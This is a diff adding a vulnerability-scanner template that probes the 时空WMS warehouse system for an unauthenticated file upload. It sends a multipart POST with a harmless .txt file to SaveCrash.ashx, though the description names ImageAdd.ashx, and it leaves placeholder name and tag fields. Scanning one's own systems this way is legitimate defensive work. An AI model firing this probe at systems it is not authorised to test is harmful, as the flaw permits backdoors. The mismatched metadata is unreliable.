@@ -1,0 +1,39 @@
+id: skwms-SaveCrash-upload
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 时空WMS-仓储精细化管理系统 ImageAdd.ashx 接口存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%97%B6%E7%A9%BAWMS/%E6%97%B6%E7%A9%BAWMS-%E4%BB%93%E5%82%A8%E7%B2%BE%E7%BB%86%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FImageAdd.ashx%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}"
+http:
+  - raw:
+      - |-
+        POST /crash/SaveCrash.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip
+        Content-Length: 183
+
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.txt"
+        Content-Type: text/plain
+
+        123
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.txt'
+      - type: status
+        status:
+          - 200
